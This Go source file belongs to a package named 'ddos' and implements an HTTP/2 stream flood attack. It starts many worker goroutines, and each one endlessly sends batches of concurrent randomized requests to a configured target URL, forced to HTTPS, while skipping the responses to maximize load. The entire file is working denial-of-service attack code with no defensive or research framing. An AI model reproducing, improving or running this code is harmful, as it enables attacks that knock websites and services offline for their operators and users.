package ddos

import (
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// startHTTP2StreamFlood starts HTTP/2 stream flood attack
func (d *DDoSAttack) startHTTP2StreamFlood() {
	d.startHTTP2StreamFloodWorkers(d.config.MaxThreads)
}

// startHTTP2StreamFloodWorkers starts HTTP/2 stream flood workers
func (d *DDoSAttack) startHTTP2StreamFloodWorkers(numWorkers int) {
	// Always use connection pool (required for efficiency)
	pool, err := NewClientPool(d.config)
	if err != nil {
		return
	}
	d.clientPool = pool

	// Create request builder (always enabled with randomization)
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	// Determine target URL (force HTTPS for HTTP/2)
	targetURL := d.config.TargetURL
	if !strings.HasPrefix(targetURL, "https://") {
		if strings.HasPrefix(targetURL, "http://") {
			targetURL = strings.Replace(targetURL, "http://", "https://", 1)
		} else {
			targetURL = "https://" + targetURL
		}
	}

	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.http2StreamFloodWorkerWithPool(pool, targetURL)
	}
}


// http2StreamFloodWorkerWithPool floods server with HTTP/2 streams using connection pool
func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL string) {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			// Create streams concurrently
			atomic.AddInt64(&d.totalBatches, 1)
			var wg sync.WaitGroup
			successCount := int64(0)

			for i := 0; i < d.config.MaxStreamsPerConn; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					client := pool.GetClient()
					if client == nil {
						return
					}

					req, err := d.requestBuilder.(*RequestBuilder).BuildRequest()
					if err != nil {
						atomic.AddInt64(&d.requestsFailed, 1)
						return
					}

					if d.sendHTTP2StreamRequestWithClient(client, req) {
						successCount++
					}
				}()
			}
			wg.Wait()

			if successCount > 0 {
				atomic.AddInt64(&d.successfulBatches, 1)
			}
		}
	}
}


// sendHTTP2StreamRequestWithClient sends a request using the provided client (for pool-based workers)
func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *http.Request) bool {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	req = req.WithContext(d.ctx)

	startTime := time.Now()
	atomic.AddInt64(&d.requestsSent, 1)

	resp, err := client.Do(req)
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return false
	}
	defer resp.Body.Close()

	// Always skip response reading for maximum efficiency
	resp.Body.Close()

	responseTime := time.Since(startTime)
	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
	atomic.AddInt64(&d.requestsSuccess, 1)

	return true
}

